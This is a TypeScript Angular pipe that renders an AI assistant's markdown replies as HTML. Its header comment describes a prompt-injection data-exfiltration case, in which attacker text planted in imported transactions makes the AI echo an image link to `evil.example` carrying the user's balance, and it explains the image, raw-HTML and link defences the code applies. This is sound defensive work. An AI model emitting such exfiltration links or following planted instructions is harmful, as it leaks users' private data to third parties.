import { Pipe, PipeTransform } from '@angular/core';
import { Marked, Renderer } from 'marked';

function escapeHtml(text: string): string {
  return text
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}

/**
 * A private `Marked` instance, so these renderer overrides never leak into any
 * other use of the global `marked`.
 *
 * AI replies are untrusted: they can echo text an attacker planted in the
 * user's data (for example an imported transaction description). The browser
 * fetches an image URL on its own, so `![](https://evil.example/?d=<balance>)`
 * would send private data to a third party without a single click. To close
 * that off:
 *  - markdown images render as their alt text only;
 *  - raw HTML in the reply is shown as text instead of being passed through
 *    (otherwise a literal `<img src=...>` would bypass the image rule);
 *  - links open in a new tab with `noopener noreferrer`.
 * The nginx Content-Security-Policy (`img-src 'self' data: blob:`) is a second
 * line of defence for the same case.
 */
const markdown = new Marked({
  gfm: true,
  // `breaks: true` turns a single newline into `<br>` so chat replies keep
  // their line breaks without needing blank lines.
  breaks: true,
  renderer: {
    // `text` is already HTML-escaped by marked.
    image: ({ text }) => text,
    html: ({ text }) => escapeHtml(text),
    link(token) {
      return Renderer.prototype.link
        .call(this, token)
        .replace(/^<a /, '<a target="_blank" rel="noopener noreferrer" ');
    },
  },
});

/**
 * Renders an AI assistant markdown reply (GitHub flavoured) to an HTML string
 * for `[innerHTML]`. Angular's built-in `DomSanitizer` still runs on the
 * result and strips `<script>`, event handlers and `javascript:` URLs.
 */
@Pipe({ name: 'markdown' })
export class MarkdownPipe implements PipeTransform {
  transform(value: string | null | undefined, copyCodeLabel?: string): string {
    if (!value) return '';
    const html = markdown.parse(value, { async: false }) as string;
    if (!copyCodeLabel) return html;

    const label = copyCodeLabel
      .replaceAll('&', '&amp;')
      .replaceAll('"', '&quot;')
      .replaceAll('<', '&lt;');
    return html.replace(
      /<pre><code\b/g,
      `<pre><span role="button" tabindex="0" class="md-code-copy" aria-label="${label}" title="${label}"></span><code`,
    );
  }
}
